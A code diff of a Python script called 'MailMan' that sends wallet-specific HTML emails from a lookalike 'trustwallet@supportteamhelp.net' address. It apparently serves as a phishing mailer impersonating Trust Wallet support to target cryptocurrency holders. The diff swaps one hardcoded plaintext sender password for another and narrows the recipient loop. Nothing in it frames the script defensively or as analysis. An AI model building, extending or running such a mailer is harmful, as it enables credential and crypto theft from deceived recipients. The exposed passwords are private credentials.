@@ -43,7 +43,7 @@ def send(wallet, email):
     """Send email with HTML template"""
     try:
         sender_email = "trustwallet@supportteamhelp.net"
-        sender_password = "FoolishGuy123$$"
+        sender_password = "7Yl-vgge"
         
         # Load HTML template
         html_content = load_html_template(wallet)
@@ -75,7 +75,7 @@ def main():
     print("=== MailMan ===\n")
     
     emails = []
-    for i in range(1, 11):
+    for i in range(1, 2):
         email = input(f"Enter Client Email {i}: ")
         
         if '@' not in email:
@@ -118,4 +118,5 @@ if __name__ == "__main__":
 
 #dimitris.ns.cloudflare.com
 #gail.ns.cloudflare.com
+
 
